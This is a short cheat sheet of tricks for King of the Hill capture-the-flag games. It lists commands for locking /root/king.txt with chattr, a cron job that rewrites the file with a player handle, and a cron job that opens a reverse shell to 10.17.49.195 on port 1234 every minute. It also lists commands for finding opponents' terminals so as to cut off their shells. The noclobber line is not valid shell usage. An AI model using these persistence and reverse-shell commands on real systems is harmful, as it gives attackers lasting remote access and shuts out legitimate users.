# KOTH-Tricks
### Make King.txt unwritable
chattr +ai /root/king.txt
set -o noclobber /root/king.txt
### Use Cronjobs automation
* * * * * echo "WildInsect" > /root/king.txt >/dev/null 2>&1
* * * * * /bin/sh -i >& /dev/tcp/10.17.49.195/1234 0>&1
## Braking opponent shell
### find pts of opponet
ps aux | grep pts
who
w

      

